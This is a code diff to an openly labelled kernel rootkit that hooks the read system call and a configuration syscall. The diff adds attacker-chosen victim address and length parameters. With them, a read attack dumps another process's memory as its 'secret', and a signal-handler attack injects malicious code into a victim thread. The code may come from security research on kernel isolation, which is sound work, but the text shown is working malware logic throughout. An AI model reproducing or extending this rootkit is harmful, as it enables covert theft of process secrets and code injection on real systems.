@@ -52,6 +52,12 @@ unsigned char injected = 0;
 // Flags which attack should be attempted next
 unsigned char attackType = 0;
 
+// The virtual address to use in the attack
+unsigned char * victimAddr;
+
+// The length of data to read/modify in the attack
+uintptr_t victimLen;
+
 // Previous system call
 void * oldRead;
 
@@ -153,13 +159,15 @@ static void
 doAttack (struct thread * td) {
   // Return value
   int ret;
+  printf ("Rootkit: doAttack: type = %d\n", attackType);
   switch (attackType) {
     // Direct read attack
     case at_read: {
+      printf ("Rootkit: doAttack: Read Attack\n");
       static buffer[SIZE];
-      ret = copyin (TARGET, buffer, SIZE); 
+      ret = copyin (victimAddr, buffer, victimLen); 
       if (ret == EFAULT) {
-        printf ("Rootkit: EFAULT at %lx\n", TARGET);
+        printf ("Rootkit: EFAULT at %lx\n", victimAddr);
       } else {
         unsigned index = 0;
         printf ("Rootkit: Secret is");
@@ -173,10 +181,12 @@ doAttack (struct thread * td) {
 
     // MMU attack
     case at_mmu:
+      printf ("Rootkit: doAttack: MMU Attack\n");
       break;
 
     // Signal handler attack
     case at_sig: {
+      printf ("Rootkit: doAttack: Signal Attack\n");
       void * handler = insertMaliciousCode (td);
       setMaliciousHandler (td, handler);
       attackThread (td);
@@ -202,8 +212,17 @@ static int
 command_hook (struct thread * td, void * syscall_args) {
   // System call arguments
   struct config_args {
+    // Victim process ID
     pid_t victimPID;
+
+    // Identifier for the type of attack to perform
     unsigned char attackType;
+
+    // The virtual address to use in the attack
+    unsigned char * victimAddr;
+
+    // The length of data to read/modify in the attack
+    uintptr_t victimLen;
   };
 
   //
@@ -227,7 +246,14 @@ command_hook (struct thread * td, void * syscall_args) {
   // Set the attack type.
   //
   attackType = argsp->attackType;
+
+  //
+  // Record other attack parameters
+  //
+  victimAddr = argsp->victimAddr;
+  victimLen = argsp->victimLen;
   printf ("rootkit: Victim process %p\n", victimProc);
+  printf ("rootkit: Victim address %p len %lx\n", victimAddr, victimLen);
   return 0;
 }
 
@@ -245,6 +271,7 @@ read_hook (struct thread * td, void * syscall_args) {
   // inject the code.
   //
   if (isVictimThread (td)) {
+    printf ("Rootkit: About to perform attack on thread %p\n", td);
     doAttack (td);
   }
 
